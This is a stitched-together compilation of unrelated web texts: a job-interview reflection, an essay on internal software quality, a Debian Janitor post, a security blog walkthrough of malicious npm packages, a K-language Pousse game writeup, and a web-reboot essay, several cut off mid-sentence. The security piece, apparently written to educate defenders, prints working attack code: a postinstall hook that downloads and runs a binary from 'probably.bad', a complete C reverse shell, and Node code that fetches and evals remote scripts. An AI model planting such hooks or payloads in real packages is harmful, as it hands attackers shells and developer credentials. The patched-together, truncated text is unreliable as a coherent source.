<p>From all of these, I think I learned a few things from the interviews. One of the main things I learned was that I can judge a company pretty well if I ask the right questions to their employees. I also learned that strictly code-based interviews are probably the worst way to interview someone, especially if they’re whiteboard based with no computer resources. (There were some better code interviews, but they had a mix of pairing as well as other conversations too.) And the more I did strictly code-based interviews, the more I didn’t want to work at the company anymore.</p>

<p>Finally, I had a lot of rejections. It ended up helping to not think “They rejected me” but instead think “This company doesn’t fit what I’m looking for” or “This company doesn’t meet my needs.” Thinking in these terms helped me realize that really the process is not only for them to look at me, but me to look at them.<br>

<h4>The correlation principle says that our productivity is tightly correlated with the internal quality of software.</h4>
<p>The two go up together, and they go down together, and you can’t trade away the one to get more of the other. Let’s talk it over.</p>
<p>I remind us that geekery isn’t the main story right now, though you and I can use it as comfort food.</p>
<blockquote>
<p>Keep working on changing the world. We can do this. In fact, we’re the only thing that can do this, so stay safe, strong, angry, and kind out there. Black lives matter.</p>
</blockquote>
<p>The basic idea of the correlation premise is actually pretty simple, but when we introduce it, we generally get a chorus of yabbits. ("Yeah, but…") There are several confusions common to most of that chorus, so let’s look at them one at a time.</p>
<p>Confusion: mixing up internal software quality and external software quality. The yabbit takes this form: "Yeah, but we can get it done faster if we settle for it working less well."</p>
<p>See, here’s the thing: that’s generally true. We <em>can</em> deliver more quickly by settling for a lower level of value.</p>
<p>The trick is to understand the yabbit as being about <em>external</em> software quality, not <em>internal</em> software quality.</p>
<p>External Software Quality, let’s call it ESQ, is any attribute of our application that a person can experience by using it. Internal Software Quality (ISQ), on the other hand, is any attribute you of our application that you can experience only by seeing the code.</p>
<p>You <em>can</em> trade ESQ for time-to-market. You can make the app slower, or uglier. You can make it do fewer things. You can make it handle fewer cases in the things it does do. All of this will, generally, get you to the market faster.</p>
<p>Well, can we trade ISQ away to get better delivery times, the way we often do with ESQ?</p>
<p>Just as the answer with ESQ is "generally, yes", the answer with ISQ is "generally, no".</p>
<p>It’s because lowering ESQ makes some things easier, but lowering ISQ makes all things harder.</p>
<p>Write down the gigantic production function that will predict how much value gets added by your team today. They’ll be dozens of complicated terms in the expression. Sort them from biggest to smallest, and what do you get? Three of those terms are "the big three", every time.</p>
<h5>From most significant to least, the big three terms in our daily production equation are 1) How inherently complex is the problem domain? 2) How good is the team? 3) How changeable is the code?</h5>
<p>Think about how you’d alter any of these three things.</p>
<p><em>Well, dangit.</em></p>
<p>You can change the problem domain, but such changes are usually paradigm shifts, with years in the making.</p>
<p>You can change the skill level of your team, but that’s not going to get you to market faster right now, it’s more like a capital investment.</p>
<p>But that third thing: "How changeable is the code?" See, that’s just ISQ by any other name.</p>
<p>The third largest term, the easiest one for us to change, is exactly what we mean by ISQ. And that’s why we can’t trade it away for more productivity. They’re directly correlated.</p>
<p>Changing code is the fundamental behavior of software development teams. If we reduce the changeability of the code, we reduce the team’s effectiveness. We get less value or we get value more slowly.</p>
<p>A brief aside: "value". People get distracted by obsessing over what value means in their application’s context. That’s good stuff, urgent stuff, but it’s not an important argument to have here: however you define value, if getting it depends on changing code, ISQ’s the 3rd term.</p>
<p>In particular, I leave it to the value-definers in my team or org to decide about how many bugs it’s okay to ship. Shipped bugs is ESQ. ISQ is about changeability.</p>
<p>Next confusion: The timescale of ISQ impact. The yabbit sounds like "Yeah, but, even granting that ISQ is correlated, the correlation isn’t instantaneous. There’s a window where we can cheat ISQ, get to market faster, and then go back and re-raise the ISQ."</p>
<p>This take has two flaws, one obvious as all hell to anyone who’s ever had a job in the trade, and one — more important — that’s hidden from the view of most non-developers. Let’s do the hidden one first.</p>
<p>The timescale for the impact of ISQ violations is ridiculously short, far shorter than the timescale at which the majority of your time-to-market calculations take place.</p>
<p>Take a weak variable name, for instance. How soon does that weak name’s effect on ISQ take place? Well. The only reason you give a variable a name at all is so you can use it. And you use it immediately. (In some styles of programming, you use it before you even define it.)</p>
<p>This holds true for most of the ISQ violations: weak naming, poor factoring, signal-hiding, testlessness, strong coupling, the list goes on and on. Every one of these starts taking effect immediately.</p>
<p>And their effect isn’t linear, either. One bad name won’t sink a ship. A hundred bad names will. And that’s one of the <em>smaller</em> violations. The big ones scale out of control even more quickly.</p>
<p>So the hidden flaw in the yabbit is that breaking ISQ has serious impact much more rapidly than non-developers think. (And, frankly, than noob developers think, too, and they dominate the mix at most orgs)</p>
<p>What about the obvious flaw? "We’ll fix the ISQ right after we ship."</p>
<blockquote>
<p><em>uhhh-HAHAHAHAHAAHAHA!</em> No we won’t.</p>
</blockquote>
<p>There are real reasons why, but you know what, I’m not even going to bother.</p>
<p><em>We won’t.</em></p>
<p>Next confusion: conflating ISQ with "clean", its cognates, its synonyms, and its overtones. The yabbit form is a bewildering variety of this shape: "Yeah, but, we don’t have time for you to wash the dishes, we gotta go now."</p>
<p>I am long on record as opposing the use of "clean" as a word to describe ISQ. Not only is it misleading about what ISQ activity looks like, it’s also misleading about the impact of low ISQ. (It’s also commonly used to suggest moral deficits on the part of people we want to beat.)</p>
<p>Maintaining my ISQ doesn’t look like cleaning. It’s not getting on a ladder to brush away cobwebs. It’s not doing the laundry. It’s not washing carefully behind my ears. It’s not emptying the kitchen sink of dirty dishes.</p>
<p>If it resembles anything in the physical world, it’s incrementally remodeling my space. Rerranging walls, putting shower &amp; toilet close together but not on top of each other, and so on. But even that’s a lousy metaphor, because it doesn’t mention <em>why</em>: for optimal performance.</p>
<p>See, my living space is used for lots and lots of different activities, so there isn’t really a single optimal layout. Optimality here is largely a matter of taste, not just in how you prioritize your particular set of activities, but in how you sort the dependencies within them.</p>
<p>But our codespace, unlike our apartment, is used for just one thing: changing code. And optimality for changing code — we call that ISQ — is much more well-defined, outside of taste, understood, and inter-subjectively confirmable.</p>
<blockquote>
<p>(Yes, there are still matters of taste. But far fewer of them, with far less variance. Having said that, let me remind you that the left-to-right ordering of arguments in a function definition is largest-scope to smalleset-scope, and Nayan is a doofus for arguing the reverse.)</p>
</blockquote>
<p>And what about impact? Look, sure, we lose some efficiency if we start with dirty dishes, or dirty laundry all over everything. But not much. We can still cook dinner, we can still get to work on time, without stopping to clean. We can. People do. All the time.</p>
<p>That’s because the cleanliness of your dishes or your room is simply not one of the largest terms determining your effectiveness as a cook or an employee. It’s just not.</p>
<p>But ISQ is the third largest term in my productivity equation. Trash my ISQ and <em>everything</em> I do is slower.</p>
<blockquote>
<p>(I’m not going to talk about the cleanliness-as-morality stick and shtick today. Look for older work if you want that. Suffice to say: Please stop equating software development efficiency with morality, especially in such a pre-adolescent manner.)</p>
</blockquote>
<p>Alright, those are three common confusions and yabbits around the correlation premise. Let’s quickly review the case we’re making, this time without all the yabbits.</p>
<p>We want more value faster. The value could be "more features", or "lower MTBF", or "smaller footprint" or "faster runtime" or "better UX" or "fewer bugs". The only fixed aspect of the value definition for the purposes of this case: to get it we have to change code.</p>
<p>Some code is more easily changed than other code. There are a lot of factors involved in this, but they mostly come down to whether it is arranged in such a fashion that humans can quickly grok its meaning.</p>
<p>We call all of the attributes of "easily changed" by another name: Internal Software Quality, or ISQ for short. That’s as opposed to External Software Quality (ESQ). The difference: any user can detect ESQ attributes, but only people with the codebase can detect ISQ attributes.</p>
<p>The correlation principle: Productivity and Internal Software Quality are directly &amp; strongly correlated. They go up together, and they go down together. You can’t trade away ISQ to get more productivity. You can reduce time-to-market by giving up ESQ, but not ISQ.</p>

            <p>The <a href="https://jelmer.uk/debian-janitor.html">Debian Janitor</a> is an automated
system that commits fixes for (minor) issues in Debian packages that can be
fixed by software. It gradually started proposing merges in early
December. The first set of changes sent out ran <a href="https://salsa.debian.org/jelmer/lintian-brush">lintian-brush</a> on sid packages maintained in
Git. This post is part of <a href="https://jelmer.uk/tag/janitor-update.html">a series</a> about the progress of the
Janitor.</p>
<div id="scheduling-lintian-fixes">
<h2>Scheduling Lintian Fixes</h2>
<p>To determine which packages to process, the  <a href="https://janitor.debian.net/">Janitor</a>  looks at the import of  <a href="https://lintian.debian.org/">lintian</a>  output across the archive that is available
in  <a href="https://wiki.debian.org/UltimateDebianDatabase/">UDD</a> <a href="#f1" id="id1">[1]</a>. It
will prioritize those packages with the most and more severe issues that it has
fixers for.</p>
<p>Once a package is selected, it will clone the packaging repository and run
<a href="https://manpages.debian.org/testing/lintian-brush/lintian-brush.1.en.html">lintian-brush</a>
on it.  Lintian-brush provides a framework for applying a set of “fixers” to a
package. It will run each of a set of “fixers” in a pristine version of the
repository, and handles most of the heavy lifting.</p>
</div>
<div id="the-inner-workings-of-a-fixer">
<h2>The Inner Workings of a Fixer</h2>
<p>Each fixer is just an executable which gets run in a clean
checkout of the package, and can make changes there. Most
of the fixers are written in Python or shell, but they
can be in any language.</p>
<p>The contract for fixers is pretty simple:</p>
<ul>
<li>If the fixer exits with non-zero, the changes are reverted and fixer is
considered to have failed</li>
<li>If exits with zero and made changes, then it should write a summary of its
changes to standard out</li>
</ul>
<p>If a fixer is uncertain about the changes it has made, it should report so on
standard output using a pseudo-header.  By default, lintian-brush will discard
any changes with uncertainty but if you are running it locally you can still
apply them by specifying <tt><span>--uncertain</span></tt>.</p>
<p>The summary message on standard out will be used for the commit message and
(possibly) the changelog message, if the package doesn’t use gbp dch.</p>

<h2>Example Fixer</h2>
<p>Let’s look at an example. The package priority “extra” is deprecated since
Debian Policy 4.0.1 (released August 2 017) – see
<a href="https://www.debian.org/doc/debian-policy/ch-archive.html#priorities">Policy 2.5 "Priorities"</a>.
Instead, most packages should use the “optional” priority.</p>
<p>Lintian will warn when a package uses the deprecated “extra” value for the
“Priority”  - the associated tag is
<a href="https://lintian.debian.org/tags/priority-extra-is-replaced-by-priority-optional.html">priority-extra-is-replaced-by-priority-optional</a>.
Lintian-brush has a fixer script that can automatically replace “extra” with
“optional”.</p>
<p>On systems that have lintian-brush installed, the source for the fixer lives in
<a href="https://salsa.debian.org/jelmer/lintian-brush/-/blob/master/fixers/priority-extra-is-replaced-by-priority-optional.py">/usr/share/lintian-brush/fixers/priority-extra-is-replaced-by-priority-optional.py</a>,

August 22, 2020 | https://blog.phylum.io/malicious-javascript-code-in-npm-malware/ | <a href="https://web.archive.org/web/*/https://blog.phylum.io/malicious-javascript-code-in-npm-malware/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>What does a malicious package actually look like in practice? We'll walk through some hypothetical exercises to see how malware generally works, and what sort of functions we might expect, from relatively simple and temporary, to complex. Additionally, as we are focused primarily on Javascript for this post, we really need to think about two different threat models: what does in-browser malware look like, and how is that going to differ from on-host malware? What are primary attack methods, what could an attacker feasibly accomplish with each level of access, and what has malware historically done in each context? To that end, we will actually split this into a series of articles: in the first (this post), we will begin to examine what "on-host" Javascript malware looks like, followed by a more in-depth look at what we can do to make our malware stealthier and more resistant to removal. Finally, in the last set of posts, we will delve into browser-based malware, and what we can accomplish within the browser sandbox.</p><h3 id="attacker-motivations-and-mentality">Attacker Motivations and Mentality</h3><p>As we begin this thought experiment, the first thing to consider is what a potential attacker's targets and goals would be. We'll focus on NPM specifically in this article, primarily because it gives a good survey of several platforms (in-browser vs on-system) with differing threat models, but the general process, methodologies, and concerns remain the same across other platforms, languages, and ecosystems.</p><h3 id="on-host">On-Host</h3><p>The whole concept of "on-host" malware in NPM packages seems a bit unintuitive at first blush, as the immediate association is generally with browser-focused concerns - which <em>must</em> be safe, since the run in the browser sandbox. In reality, however, on-host<a href="https://arxiv.org/abs/2005.09535"> is actually where most observed Javascript malware runs</a>. There are, interestingly enough, some serious advantages from an attacker's perspective in running there, rather than in an end user's web browser:</p><ul><li>If we run outside of a browser, we have the same level of access as the developer installing our package.</li><li>Running within a large, mainstream package in an end-user's browser increases our odds of being discovered - many more products and users are observing package behavior at the endpoint than during the build process.</li><li>To add to the last point, many security products actually ignore things like <code>devDependencies</code> entirely, and many of the infrastructure pieces, such as CI builders, where build-related code will run on has little-to-nothing in terms of security measures and mitigations.</li></ul><p>While this certainly doesn't mean we are <em>restricted</em> to operating on-host (as we'll see later, there is plenty we can do in-browser), this makes it a very compelling place to begin our journey. As such, we'll walk through an iterative process of making our badware package, and applying some gradual improvements.</p><h3 id="crawl">Crawl</h3><p>To start the project off, we'll build a simple npm package. What exactly it will do, or what value it will provide is largely irrelevant; for argument's sake, it might change the console font color, or include some pictures of cats, &nbsp;but in practice, it simply exists to bundle in our malware.</p><p>In order for our malware to be even moderately successful, we need three elements:</p><ol><li>To gain execution.</li><li>Network access.</li><li>To ensure the user remains unaware that we are running.</li></ol><p>To get what we might consider the most basic form of item one, we'll take a page from some prior work and leverage a great feature of our javascript tooling - the <code>postinstall</code> script. &nbsp;To that end, we'll start with our <code>package.json</code>:</p><pre><code>{
    "name": "mostly-harmless",
    "version": "1.0.0",
    /* ... */
    "scripts": {
        "postinstall": "wget https://probably.bad/malware &amp;&amp; chmod +x malware &amp;&amp; ./malware &amp;"
    }
}</code></pre><p>and (for now, at least) we won't make our malware too complex, perhaps we'll simply start with something like the following:</p><figure><pre><code>#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(int argc, char** argv)
{
    struct sockaddr_in addr = {0};
	unsigned short     port = 1028;
	const char*        netaddr = "10.0.0.20";
	int                sock = -1;

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	if(0 == inet_aton(netaddr, &amp;addr.sin_addr)) {
		return 0;
	}
    
	if(-1 == (sock = socket(AF_INET, SOCK_STREAM, 0))) {
		return 0;
	}

	if(connect(sock, (struct sockaddr*)&amp;addr, sizeof(addr))) {
		goto Cleanup;
	}
    
    if(-1 == dup2(sock, STDOUT_FILENO)) {
		goto Cleanup;
	}

	if(-1 == dup2(sock, STDIN_FILENO)) {
		goto Cleanup;
	}

	if(-1 == dup2(sock, STDERR_FILENO)) {
		goto Cleanup;
	}
	execlp("/bin/bash", "bash", NULL);

Cleanup:
	close(sock);
    
    return 0;
}</code></pre><figcaption>A simple reverse shell</figcaption></figure><p>A small program that will essentially give us a reverse shell - first by opening a socket, connecting to our "remote" server, redirecting stdin/stdout/stderr to our new socket, and then executing bash. From here, we have full console access to the local machine in the same context as the current user (presumably either a developer or a CI runner). </p><p>While this certainly works, and gives us access, it comes with some serious limitations. For one, it's fairly trivial to detect - a simple <code>netstat -an</code> will identify it easily. Another issue is that we have to be ready to accept the connection as soon as the user runs <code>npm install</code>, as it will only try to connect out once, and will die when the current user logs off (barring detached terminals or similar). Finally, it is very overt - not only would most network security devices (IDS or IPS) catch this traffic in-flight, even a casual observer would find this when perusing the <code>package.json</code>. </p><p>Oddly enough, however, the last point (at least, regarding the <code>package.json</code>) is less bad than one might think - while trivial observations would certainly catch it, if our malware is upstream from any non-trivial package installation, manual <a href="https://blog.phylum.io/what-is-the-state-of-npm/">identification might end up being nearly impossible.</a> In fact, as documented in "The Backstabber's Knife Collection" (linked earlier in the article), this sort of scheme <em>has</em> worked for a large subset of discovered javascript malware. Still, we can almost certainly do better.</p><h3 id="walk">Walk </h3><p>Now we have a notional infection vector (via our <code>postinstall</code> script), and some code to give us access to the remote host. Where do we go from here to look at improving our setup? We can draw some inspiration from <a href="https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes">malware added upstream from <code>eslint</code></a> which harvested (and shipped off) tokens and credentials from the local system, effectively giving attackers the ability to modify previously-published packages controlled by the current user at a future date.</p><p>While we're actually obtaining credentials here, focusing on a single file with a small number of credentials that may (or may not) be on most of the machines we land on seems a bit lackluster when we can look for other locally stored credentials (e.g., AWS tokens, SSH keys, etc) and environment variables.</p><p>In order to get this new functionality up and running, we can start by making a quick change to our previous <code>package.json</code>:</p><pre><code>{
    "name": "mostly-harmless",
    "version": "1.0.1",
    /* ... */
    "scripts": {
        "postinstall": "node ./lib/build.js"
    }
}</code></pre><p>Now instead of running our <em>new</em> malware directly in this file, we'll make it slightly stealthier by remote-hosting the file, and pulling it down at runtime. A quick first pass at this might resemble the following:</p><pre><code>try {
    const https = require("https");
    https.get({
        hostname: "probably.bad",
        path: "/new-malware",
        headers: {
            Accept: "text/html"
        }
    }, 
    res =&gt; { res.on("data" d =&gt; eval(d)); })
        .on("error", () =&gt; {});
       
} catch (e) {}</code></pre><p>Interestingly enough, this is actually <em>almost</em> exactly the same as the malware that launched in the aforementioned <code>eslint</code> attack: it would pull the file retrieval script from a remote host (where we've slotted in our hypothetical attack domain, "probably.bad", the original utilized pastebin), and simply eval the text. While this is mostly effective, there is a critical flaw here - if for some reason we don't get the entire script to execute in the first chunk, our <code>eval</code> will likely fail with syntax error, as we might be attempting to execute half a script (for reference, a copy of the original malware with deeper explanation of the attack and constituent parts can be found <a href="https://gist.github.com/hzoo/51cb84afdc50b14bffa6c6dc49826b3e">here</a>), which ended up resulting in the attack being discovered quickly. </p><p>Now certainly the first issue is relatively simple to fix: we need to ensure we've downloaded the <em>full</em> file before we attempt to eval. &nbsp;To that end, what we probably want is something more like the following:</p><pre><code>try {
    const https = require("https");
    https.get("https://probably.bad/new-malware", res =&gt; {
        let tmp = "";
        res.on("data", d =&gt; tmp += d);
        res.on("end", () =&gt; eval(tmp));
    }).on("error", () =&gt; {});
} catch(e) {}</code></pre><p>This should get us more consistent execution at least, but now to think about <em>what</em> we should be harvesting - are NPM creds or crypto wallets really the best we can do? If we think about this a bit, there are two general contexts under which we will run:</p><ol><li>On a developer's system.</li><li>On a CI runner.</li></ol><p>From an attacker's perspective, both places are interesting - albeit for slightly different reasons. In the first case, the answer is somewhat obvious: we are going to be running on a developer's workstation while a project is being built and tested locally. This means that things like credentials (NPM creds, SSH keys, and many more) will likely be available for access and exfiltration, among other things. The second scenario, however, is also interesting - CI runners often get sensitive items such as database credentials, infrastructure keys, and similar injected during the build process. Past experience also shows that some attackers have …</p></div></div>

<h2>Introduction</h2>

<p>The challenge task for the 1998 ICFP Functional Programming
Contest consisted of a program for playing the game 'Pousse', or
'Push'.</p>

<p>The contest was announced on a Thursday evening and ran
through the weekend. A single judge's prize, for the most thought-provoking
entry, was awarded to the J Language team from Iverson Software,
Inc.</p>

<p>The <a href="http://www.jsoftware.com/papers/pousse.htm">J
entry</a> consists of 113 lines of code (excluding comments and
test code). A full screen interactive version contains 400 lines.
</p>

<p>Pousse is played by two players X and O on an N x N board.
Player X always moves first. A token may be entered from the
left, the right, the top, or the bottom of the board, giving a
total of N * 4 possible moves.</p>

<p>Placing a token onto the board causes all tokens in that row
or column up to the first unoccupied cell to be shifted to make
room for the new token. If the row or column is fully occupied,
the last token is pushed off the board.</p>

<p>A row or column fully occupied by tokens of the same color is
called a straight. </p>

<p>The game rules are:</p>

<blockquote>
<ul>
<li>A player wins when he achieves a surplus of straights.</li>
<li>A player loses if his move causes the board to re-enter a state which he caused earlier in the game.</li>
<li>A player loses if he exceeds the time-limit on a turn.</li></ul>
</blockquote>

<h2>Strategy</h2>

<p>Notwithstanding its simplicity, the playing strategy developed
by the J team is surprisingly effective:</p>

<blockquote>
<ul>
<li>On my turn, evaluate the boards resulting from my 4 * N moves.</li>
<li>If all moves result in an immediate loss for me, select any one of those.</li>
<li>Else if there are winning moves for me, select any one of those.</li>
<li>Else select one of the moves which minimize the best counter-move of my opponent.</li>
</ul>
</blockquote>

<h2>K implementation</h2>

<p>The <a href="http://www.nsl.com/k/push.k">K implementation</a> of Pousse uses
the J strategy.</p>

<p>The program supports two playing modes: interactive
competition between a human player and a machine, and self-play,
which pits the strategy against itself.</p>

<p>The K implementation (henceforth called 'push.k') consists of
92 lines of code. This comprises the playing logic and strategy (36
lines), as well as the global state (14 lines), GUI (13 lines),
on-line help (22 lines), and run-time procedures (7 lines).</p>

<h2>Design</h2>

<p>The script for push.k is divided into five main sections: the
playing logic, the global state, the GUI, the on-line help text,
and the procedures for initializing state when the script is
loaded. These sections are separated by single blank lines.</p>

<p>It is convenient to begin with section 2, the global state.</p>

<h2>State</h2>

<p>The script is written to accept two optional command-line
arguments: N, the number of cells along a side of the board, and
T, the timeout value in seconds. The default values are N = 6, T
= 30.</p>

<p>Following the empirical results obtained by the J team, the
cells of an N x N board are weighted to the center. The variable
D is recomputed whenever N is changed, and always has shape N x N.
For N = 6:</p>

<blockquote>
        <pre>  D
(1 2 3 3 2 1
 2 3 4 4 3 2
 3 4 5 5 4 3
 3 4 5 5 4 3
 2 3 4 4 3 2
 1 2 3 3 2 1)</pre>
</blockquote>

<p>For an N x N board, the set of N * 4 valid
moves is contained in M. For N = 3:</p>

<blockquote>
        <pre>  M
((`L;0)
 (`L;1)
 (`L;2)
 (`T;0)
 (`B;0)
 (`T;1)
 (`B;1)
 (`T;2)
 (`B;2)
 (`R;0)
 (`R;1)
 (`R;2))</pre>
</blockquote>

<p>A board is represented as an N x N character
matrix. The board-history of a game containing k moves is
represented as a (k+1) x N x N list H. Initially, H consists of a
single empty board. For N = 3:</p>

<blockquote>
        <pre>  H
,("   "
  "   "
  "   ")</pre>
</blockquote>

<p>In the course of play, boards are appended to H.</p>

<p>The move-history of a game containing k moves
is kept in a k x 2 list:</p>

<blockquote>
        <pre>  I
(("X"
  (`B;1))
 ("O"
  (`L;0))
 ("X"
  (`B;1))
 ("O"
  (`T;9))
 ("X"
  (`B;1)))</pre>
</blockquote>

<p>Move I[0] consisted of X playing (`B;1), and
transformed the board from state H[0] to H[1]:</p>

<blockquote>
        <pre>  H[0 1]
(("   "
  "   "
  "   ")
 ("   "
  "   "
  " X "))</pre>
</blockquote>

<p>At the start of each game, the token of the
machine is randomly selected and stored in P. In the game above,
P = "X".</p>

<p>The variables W and O jointly represent the
outcome of the game. Initially, they are W = " " and O
= 0.</p>

<p>If X wins, then W = "X" and O = 1,
and if X loses, then W = "X" and O = -1.</p>

<p>At the start of each turn, the global counter C
is set to 0. Each second, a timer function fires which increments
C and compares it to T, the timeout value. If T = C, the player
of the turn loses.</p>

<p>The boolean global S is used to distinguish
human-machine play (S = 0) and self-play (S = 1).</p>

<p>The variables E and R are used by the GUI (see
below). </p>

<h2>Dependencies</h2>

<p>push.k uses K dependencies to keep global state
and GUI self-consistent.</p>

<p>In general, there are two ways to keep GUI and
global state consistent. In most programming environments, a
procedural method is used: whenever any part of the state
changes, invoke procedures to update the rest of the state and
the GUI, and whenever any part of the GUI changes, invoke
procedures to update the rest of the GUI and the state. The
disadvantage of the procedural approach is that small changes to
the system require changes to many procedures. </p>

<p>The alternative method uses dependencies: the
state is defined as a functional dependency network, and the GUI
is defined as a dependency on state. Whenever the root of the
network changes, the rest of the network, including state and
GUI, is invalidated; reference to any dependent component causes
that component (and all components on which it depends) to re-evaluate.</p>

<p>The root of the push.k dependency network is N.
All variables, including those which are mapped to the screen as
constituents of the playing window, ultimately depend on the size
of the board.</p>

<p>D, the weight matrix, is a function of N:</p>

<blockquote>
        <pre>D..d:"weights N" </pre>
</blockquote>

<p>E, a list of indices into those edge positions
of the board which accept click events, is a function of N:</p>

<blockquote>
        <pre>E..d:"edges[-1_'1_'(N+2)_vs!_(N+2)^2]N+1" </pre>
</blockquote>

<p>M, the list of moves is a function of N and E.</p>

<blockquote>
        <pre>M..d:"moves[N].'E" </pre>
</blockquote>

<p>R, a vector of indices into E which do not
repeat previous states of the board, depends on H and M.</p>

<blockquote>
        <pre>R..d:"nreps[H]M"</pre>
</blockquote>

<p>H, the board history, is reinitialized to ,(N,N)#"
" whenever N changes.</p>

<blockquote>
        <pre>H..d:",(N,N)#\" \""</pre>
</blockquote>

<p>P, the token assigned to the machine, is
recomputed whenever N changes.</p>

<blockquote>
        <pre>P..d:"N;piece[]"</pre>
</blockquote>

<p>I, W, C, S, and O, described above, are reset
to constant values whenever N changes.</p>

<blockquote>
        <pre>I..d:"N;()" 
W..d:"N;\" \"" 
C..d:"N;0" 
S..d:"N;0" 
O..d:"N;0"</pre>
</blockquote>

<p>Whenever N is reset, the global state (including
the GUI variables described below) is invalidated. A trigger on
N,</p>

<blockquote>
        <pre>N..t:"hd[];sh[]"</pre>
</blockquote>

<p>causes the window to be hidden, and then shown.
</p>

<blockquote>
        <pre>hd:{`hide$`.k} 
sh:{`show$`.k} </pre>
</blockquote>

<p>Showing the window causes the invalid global
state to be recomputed to appropriate values, which in turn
causes the window to be redrawn with correct size, color, and
labels.</p>

<h2>Logic</h2>

<p>We step through the evaluation of two moves.</p>

<p>Begin by executing the niladic function 'play':</p>

<blockquote>
        <pre>Z.play:{N::;if[P="X";me who[]]}</pre>
</blockquote>

<p>N is reset to its current value, invalidating
all state variables and causing the playing window to be
refreshed. </p>

<p>If P is "X", then the machine makes
the first move. The niladic function 'who' returns the token of
the current player. Since X always moves first, the token of the
current player is simply the parity of the length of the board-history
H:</p>

<blockquote>
        <pre>who:{"OX"(#H)!2}</pre>
</blockquote>

<p>If the game is not over, then initialize the
timer counter C, and call 'go' with token x and the move computed
by the strategy function 'str'.</p>

<blockquote>
        <pre>me:{if[~O;C::0;go[x]str[x;*|H]]}</pre>
</blockquote>

<p>'str' takes two arguments: token x and the
current state of the board (the last item in H):</p>

<blockquote>
        <pre>str:{:[#R;ev2[x;move[x;y]'M R];*M]}</pre>
</blockquote>

<p>If there are moves which do not repeat the
previous state of the board -- that is, if 0 &lt; #R -- then call
'ev2' to select from the space of possible moves, else return the
first move. Observe that if no non-repeating moves are available,
the game is lost: *M is no worse than any other move.</p>

<p>'ev2' takes two arguments: token x, and a list
of the boards which result from x applying a non-repeating move
to board y.</p>

<p>First we look at 'move' and its subfunctions. </p>

<p>'move' takes token x, board y, and move-instruction
z and returns the result of applying (x;z) to y.</p>

<blockquote>
        <pre>move:{F[*z;1]@[F[*z;0]y;z 1;push[x]]}
push:{x,y _di(-1+#y)&amp;y?" "}
F[`T`R`L`B]:((+:;+:);(|:';|:');(::;::);(|:'+:;+|:'))</pre>
</blockquote>

<p>z has the form (f;n), where f is `L, `R, `T, or
`B, and n is in 0 ... N-1. Suppose that f is `L and the nth row
of board y is</p>

<blockquote>
        <pre>"XXO X "</pre>
</blockquote>

<p>Then if x is "X", the result of
applying move (f;n) to board y is</p>

<blockquote>
        <pre>"XXXOX"</pre>
</blockquote>

<p>Alternatively, suppose that the nth row of y is</p>

<blockquote>
        <pre>"XXOOXO"</pre>
</blockquote>

<p>Then the result is:</p>

<blockquote>
        <pre>"XXXOOX"</pre>
</blockquote>

<p>Rather than write four special cases to deal
with left, right, top, and bottom token-insertion, 'move'
transforms the board so that 'push' can treat any move as an
insertion from the left, then applies the reverse transformation
to the result. The four pairs of transformations are stored in
the dictionary F. For example, suppose that f is `T. Then F[f] is
(+:;+:). F[f;0] transposes the board, putting the top of y on the
left:</p>

<blockquote>
        <pre>  y
("XOX"
 " XO"
 "   ")</pre>
        <pre>  F[`T;0]y
("X  "
 "OX "
 "XO ")</pre>
</blockquote>

<p>and F[f;1] undoes the transformation.</p>

<p>The way to read </p>

<blockquote>
        <pre>F[*z;1]@[F[*z;0]y;z 1;push[x]] </pre>
</blockquote>

<p>is: </p>

<blockquote>
        <pre>apply F[*z;1] to:
 the result of applying push[x] to:
  the z 1-th row of the result of applying F[*z;0] to:
   y</pre>
</blockquote>

<p>The 'push' function prepends token x to row y
from which we remove either the first blank (case 1 above) or the
last token (case 2 above). That is, we read</p>

<blockquote>
        <pre>x,y _di(-1+#y)&amp;y?" " </pre>
</blockquote>

<p>as: x joined with y without the index of the
minimum of the last position and the index of the first blank.</p>

<p>Now we can return to 'ev2'.</p>

<blockquote>
        <pre>ev2:{any@:[#i:&amp;0&lt;x evs'y;i;mmx opp[x]ev''y move[opp x]/:\:M]}
mmx:{&amp;(&amp;/m)=m:|/'x}
any:{M R x()_draw#x}</pre>
</blockquote>

<p>x is the current token and y is a list of
boards. 'ev2' applies 'any' to the result of a conditional of the
form</p>

<blockquote>
        <pre>:[a;b;c]</pre>
</blockquote>

<p>In the condition, we check to …</p></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The web is in need of some reinvention right now.</p><p>The web’s evolution over the last decade has mirrored the American economy. All of the essential indicators are going “up and to the right,” a steady stream of fundamental advances reassure use that there “is progress,” but the actual experience and effects for individuals stagnates or regresses.</p><p>The crisis affects platforms, creators, and consumers alike.</p><p><em>I’m going to try and dissect and diagnose this situation, a bit. You can skip forward if you just want to read my casual, unprofessional pitch for a reboot of the web. The idea is that we could choose a new lightweight markdown format to replace HTML &amp; CSS, split the web into documents and applications, and find performance, accessibility, and fun again.</em></p><details><summary>This post uses the pedantic definition of "the web"</summary>I've discussed attempts to reinvent the "Internet" a few times. Things like dat, IPFS, and arweave are all projects to reinvent an Internet, or a transport and data-sharing layer. The web is what lies on top of that, the HTML, CSS, URLs, JavaScript, browsing experience.</details><h3 id="the-platform-collapse">The platform collapse</h3><p>The platform side is what changed last week, when <a href="https://arstechnica.com/information-technology/2020/08/firefox-maker-mozilla-lays-off-250-workers-says-covid-19-lowered-revenue/">Mozilla laid off 250 employees</a> and indicated that it would affect Firefox development. Firefox wasn’t the #2 browser - that’s Safari, mainly because of the captive audience of iPhone and iPad users. But it was the most popular browser that people <em>chose</em> to use.</p><p><img alt="Chart of browser market share, with Chrome becoming the monopoly" src="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-chart-of-browser-market-share-with-chrome-becoming-the-monopoly.png"></p><p><em>Chart from <a href="https://gs.statcounter.com/browser-market-share#monthly-200901-202007">statcounter</a></em></p><p>The real winner is not just Chrome, but Chrome’s engine. One codebase, <a href="https://en.wikipedia.org/wiki/KHTML">KHTML</a>, split into <a href="https://en.wikipedia.org/wiki/WebKit">WebKit</a> (Safari), and <a 